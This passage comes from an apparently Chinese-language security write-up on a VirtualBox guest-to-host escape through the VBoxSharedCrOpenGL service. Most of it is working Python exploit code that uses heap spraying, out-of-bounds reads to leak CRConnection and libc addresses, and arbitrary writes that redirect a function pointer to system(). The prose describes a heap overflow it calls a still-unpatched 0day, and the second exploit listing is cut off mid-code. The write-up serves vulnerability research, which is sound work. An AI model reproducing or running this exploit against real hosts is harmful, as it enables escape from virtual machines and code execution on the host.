    <span class="c1"># CRConnection address.</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">make_oob_read</span><span class="p">(</span><span class="n">OFFSET_CONN_CLIENT</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">crmsg</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="mh">0x290</span><span class="p">)[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span>
    <span class="n">pClient</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span> <span class="n">leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">pConn</span> <span class="o">=</span> <span class="n">pClient</span> <span class="o">+</span> <span class="mh">0x9e0</span>
    <span class="n">new_client</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
    <span class="n">set_version</span><span class="p">(</span><span class="n">new_client</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">new_client</span><span class="p">,</span> <span class="n">pConn</span><span class="p">,</span> <span class="n">pClient</span>
<span class="err">​</span>
<span class="k">class</span> <span class="nc">Pwn</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="s1">'A'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">where</span><span class="p">)</span>
        <span class="n">buf</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">pay</span><span class="p">])</span>
        
        <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="mh">0x41414141</span><span class="p">,</span><span class="mh">0x41414141</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">what</span><span class="p">])</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">write64</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span> <span class="n">what</span><span class="p">))</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="c1"># Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_HOSTBUF</span><span class="p">,</span> <span class="n">where</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_HOSTBUFSZ</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
        <span class="n">res</span><span class="p">,</span> <span class="n">sz</span> <span class="o">=</span> <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client3</span><span class="p">,</span> <span class="n">SHCRGL_GUEST_FN_READ</span><span class="p">,</span> <span class="p">[</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">canfail</span> <span class="ow">and</span> <span class="n">sz</span> <span class="o">!=</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="k">assert</span> <span class="n">sz</span> <span class="o">==</span> <span class="n">n</span>
        <span class="k">return</span> <span class="n">res</span><span class="p">[:</span><span class="n">n</span><span class="p">]</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">read64</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">canfail</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">leak</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="n">leak</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">leak_stuff</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client1</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
        <span class="n">set_version</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">)</span>
<span class="err">​</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client2</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
        <span class="n">set_version</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client2</span><span class="p">)</span>
<span class="err">​</span>
        <span class="c1"># TODO maybe spray even more?</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">):</span> <span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="mh">0x290</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">):</span> <span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="mh">0x9d0</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">600</span><span class="p">):</span> <span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
<span class="err">​</span>
        <span class="c1"># self.master_id, self.master, _ = leak_buf(self.client1)</span>
        <span class="c1"># print('[*] Header for buffer # %d is at 0x%016x (master)' % (self.master_id, self.master))</span>
        <span class="c1"># self.victim_id, self.victim, _ = leak_buf(self.client1)</span>
        <span class="c1"># print('[*] Header for buffer # %d is at 0x%016x (victim)' % (self.victim_id, self.victim))</span>
<span class="err">​</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client3</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">leak_conn</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked CRConnection @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">)</span>
    
    <span class="k">def</span> <span class="nf">setup_write</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'aaaa'</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_SHADERSOURCE_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;IIIII"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1a</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span><span class="s1">'A'</span><span class="o">*</span><span class="mi">4</span>
        <span class="n">bufs</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">):</span>
                <span class="n">bufs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span>
        <span class="n">_</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="n">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span><span class="p">,</span> <span class="p">[</span><span class="n">bufs</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">],</span> <span class="s2">"A"</span><span class="o">*</span><span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span> <span class="o">=</span> <span class="mh">0x0a0a0000</span><span class="o">+</span><span class="n">bufs</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">];</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span> <span class="o">=</span> <span class="mh">0x0a0a30</span><span class="p">;</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">leak_stuff</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">setup_write</span><span class="p">()</span>
        
        <span class="bp">self</span><span class="o">.</span><span class="n">crVBoxHGCMFree</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_FREE</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked crVBoxHGCMFree @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">crVBoxHGCMFree</span><span class="p">)</span>
        
        <span class="n">libbase</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">crVBoxHGCMFree</span> <span class="o">-</span> <span class="mh">0x20650</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">system</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read64</span><span class="p">(</span><span class="n">libbase</span> <span class="o">+</span> <span class="mh">0x22e3d0</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x122ec0</span> <span class="o">+</span> <span class="mh">0x4f440</span> 
    <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked system @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
<span class="err">​</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="mh">0x128</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">,</span> <span class="s2">"mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
        <span class="sd">'''</span>
<span class="sd">        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)</span>
<span class="sd">​</span>
<span class="sd">        hgcm_disconnect(self.client1)</span>
<span class="sd">        '''</span>
        <span class="k">return</span>
<span class="err">​</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>
    <span class="c1">#if raw_input('you want RIP control? [y/n] ').startswith('y'):</span>
    <span class="c1">#    p.rip(0xdeadbeef)</span>
<span class="err">​</span>
</code></pre></div><p><br></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif" data-caption="" data-size="normal" data-rawwidth="600" data-rawheight="456" data-thumbnail="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg" class="origin_image zh-lightbox-thumb" width="600" data-original="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg"></noscript><img src="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif" data-caption="" data-size="normal" data-rawwidth="600" data-rawheight="456" data-thumbnail="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg" class="origin_image zh-lightbox-thumb lazy" width="600" data-original="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif"></figure><p><br></p><h2><b>仍然存在的0day</b></h2><p>    Virtualbox官方在2019.1.11修补了两处类似的信息泄露部分，对于堆溢出部分的内容仍然没有修补，导致该漏洞仍然可以被利用。接下来看一下如何只使用堆溢出部分的内容来实现完整逃逸。</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg" data-caption="" data-size="normal" data-rawwidth="728" data-rawheight="599" class="origin_image zh-lightbox-thumb" width="728" data-original="https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg"></noscript><img src="https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg" data-caption="" data-size="normal" data-rawwidth="728" data-rawheight="599" class="origin_image zh-lightbox-thumb lazy" width="728" data-original="https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg"></figure><p><br></p><h2><b>从一个堆溢出到弹计算器</b></h2><p>    参考之前有leak时的思路，当没有leak时，我们仍然有：</p><p>1. 任意地址写</p><p>2. 堆越界写</p><p>    但是我们没有任何的地址信息，所以接下来的思路就是如何利用一个堆越界写来泄露地址最后达到任意地址读的效果。</p><p>    我们可以先参考之前的niklasb任意地址读的实现思路。他是通过读写一个CRConnection结构体的pHostBuffer和cbHostBuffer，以及SHCRGL_GUEST_FN_READ来实现任意地址读。我们使用相同的思路，就需要泄露一个CRConnection结构体的地址。而他之前泄露一个CRConnection结构体的位置是通过crUnpackExtendGetUniformLocation中的堆越界来实现的，而我们想要达到同样的效果可以有一种实现思路：</p><p>1. 在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer</p><p>2. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分</p><p>3. 通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读</p><p>    如果在CR_GETUNIFORMLOCATION_EXTEND Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。所以，总体的利用思路如下：</p><p>1. 排布内存，使堆空间分布如下：</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg" data-caption="" data-size="normal" data-rawwidth="813" data-rawheight="495" class="origin_image zh-lightbox-thumb" width="813" data-original="https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg"></noscript><img src="https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg" data-caption="" data-size="normal" data-rawwidth="813" data-rawheight="495" class="origin_image zh-lightbox-thumb lazy" width="813" data-original="https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg"></figure><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg" data-caption="" data-size="normal" data-rawwidth="781" data-rawheight="222" class="origin_image zh-lightbox-thumb" width="781" data-original="https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg"></noscript><img src="https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg" data-caption="" data-size="normal" data-rawwidth="781" data-rawheight="222" class="origin_image zh-lightbox-thumb lazy" width="781" data-original="https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg"></figure><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg" data-caption="" data-size="normal" data-rawwidth="863" data-rawheight="491" class="origin_image zh-lightbox-thumb" width="863" data-original="https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg"></noscript><img src="https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg" data-caption="" data-size="normal" data-rawwidth="863" data-rawheight="491" class="origin_image zh-lightbox-thumb lazy" width="863" data-original="https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg"></figure><p>2. 通过之前提到的相同操作，通过堆溢出实现任意地址写与越界写</p><p>3. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg" data-caption="" data-size="normal" data-rawwidth="815" data-rawheight="187" class="origin_image zh-lightbox-thumb" width="815" data-original="https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg"></noscript><img src="https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg" data-caption="" data-size="normal" data-rawwidth="815" data-rawheight="187" class="origin_image zh-lightbox-thumb lazy" width="815" data-original="https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg"></figure><p>4. 通过crUnpackExtendGetUniformLocation越界读获取CRConnection的地址</p><p>5. 通过CRConnection任意地址读获取crVBoxHGCMFree的地址</p><p>6. 通过动态库获取libc中system的地址</p><p>7. 修改disconnect函数指针为system，修改CRConnection头部为payload8. disconnect弹计算器 </p><p>    我在实际实现中多了一个步骤，在泄露完CRConnection地址之后还泄露了一个对应的clientID。（当然这一步也可以省略，在exp中遍历所有的clientID即可）</p><p>    完整的exp如下(环境：ubuntu 18.04及其apt安装的Virtualbox 6.0.4)：</p><div class="highlight"><pre><code class="language-python"><span></span><span class="ch">#!/usr/bin/env python2</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">array</span> <span class="kn">import</span> <span class="n">array</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span>
<span class="err">​</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span> <span class="o">+</span> <span class="s1">'/lib'</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">chromium</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hgcm</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">crVBoxHGCMFree_off</span><span class="o">=</span><span class="mh">0x20890</span>
<span class="n">vbox_puts_off</span><span class="o">=</span><span class="mh">0x22f0f0</span>
<span class="n">libc_puts_off</span><span class="o">=</span><span class="mh">0x809c0</span>
<span class="n">libc_system_off</span><span class="o">=</span><span class="mh">0x4f440</span>
<span class="k">def</span> <span class="nf">make_oob_read</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span>
        <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_GETUNIFORMLOCATION_EXTEND_OPCODE</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="o">+</span> <span class="s1">'LEET'</span>
        <span class="p">)</span>
<span class="err">​</span>
<span class="k">class</span> <span class="nc">Pwn</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="s1">'A'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">where</span><span class="p">)</span>
        <span class="n">buf</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span><span class="p">,</span><span class="mh">0x2b0</span><span class="p">,</span><span class="n">pay</span><span class="p">])</span>
        <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="mh">0x41414141</span><span class="p">,</span><span class="mh">0x41414141</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">what</span><span class="p">])</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">write64</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span> <span class="n">what</span><span class="p">))</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="c1"># Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_HOSTBUF</span><span class="p">,</span> <span class="n">where</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_HOSTBUFSZ</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
        <span class="n">res</span><span class="p">,</span> <span class="n">sz</span> <span class="o">=</span> <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client3</span><span class="p">,</span> <span class="n">SHCRGL_GUEST_FN_READ</span><span class="p">,</span> <span class="p">[</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">canfail</span> <span class="ow">and</span> <span class="n">sz</span> <span class="o">!=</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="k">assert</span> <span class="n">sz</span> <span class="o">==</span> <span class="n">n</span>
        <span class="k">return</span> <span class="n">res</span><span class="p">[:</span><span class="n">n</span><span class="p">]</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">read64</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">canfail</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">canfail</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">leak</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="n">leak</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    
    <span class="k">def</span> <span class="nf">setup_write</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client1</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
        <span class="n">set_version</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">)</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'aaaa'</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_SHADERSOURCE_EXTEND_OPCODE</span><span class="p">)</span> \
